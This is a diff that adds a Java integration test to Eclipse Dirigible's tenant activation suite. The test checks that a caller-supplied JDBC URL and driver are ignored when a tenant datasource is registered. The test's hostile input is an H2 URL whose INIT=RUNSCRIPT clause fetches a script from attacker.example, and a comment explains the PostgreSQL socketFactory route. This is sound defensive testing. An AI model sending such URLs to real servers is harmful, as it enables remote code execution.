@@ -30,6 +30,7 @@ import java.util.concurrent.TimeUnit;
 import org.awaitility.Awaitility;
 import org.eclipse.dirigible.commons.config.Configuration;
 import org.eclipse.dirigible.commons.config.DirigibleConfig;
+import org.eclipse.dirigible.components.data.sources.domain.DataSource;
 import org.eclipse.dirigible.components.data.sources.manager.DataSourcesManager;
 import org.eclipse.dirigible.components.data.sources.service.DataSourceService;
 import org.eclipse.dirigible.components.database.DirigibleDataSource;
@@ -266,6 +267,38 @@ class TenantActivationIT extends IntegrationTest {
 
         assertTrue(tenantService.findById(TENANT_ID)
                                 .isPresent());
+    }
+
+    /**
+     * A JDBC URL and driver sent by a caller must not reach the driver layer.
+     *
+     * <p>
+     * They are executable surface: an H2 URL can carry {@code INIT=RUNSCRIPT FROM '<url>'} and a
+     * PostgreSQL connection property can name a {@code socketFactory} class, so honouring one would
+     * turn the right to register a tenant's credentials into the right to run code on this server. The
+     * fields are not part of the API; this asserts what that means end to end - the request succeeds,
+     * and the definition it produced carries the application's own URL and driver.
+     */
+    @Test
+    @Order(7)
+    void aJdbcUrlAndDriverInTheRequestBodyAreIgnored() {
+        String hostileUrl = "jdbc:h2:mem:pwned;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'";
+        DataSource applicationDataSource = dataSourceService.findOptionalByName("DefaultDB")
+                                                            .orElseThrow();
+
+        restAssuredExecutor.execute(() -> given().contentType(ContentType.JSON)
+                                                 .body(Map.of("username", DB_USER, "password", DB_PASSWORD, "schema", SCHEMA, "url",
+                                                         hostileUrl, "driver", "org.postgresql.Driver"))
+                                                 .when()
+                                                 .put(TENANTS_PATH + TENANT_ID + "/datasources/default")
+                                                 .then()
+                                                 .statusCode(200));
+
+        DataSource registered = dataSourceService.findOptionalByName(TENANT_ID + "_DefaultDB")
+                                                 .orElseThrow();
+        assertEquals(applicationDataSource.getUrl(), registered.getUrl(),
+                "the URL must come from the application's own data source, never from the request");
+        assertEquals(applicationDataSource.getDriver(), registered.getDriver());
     }
 
     private static io.restassured.response.Response register() {
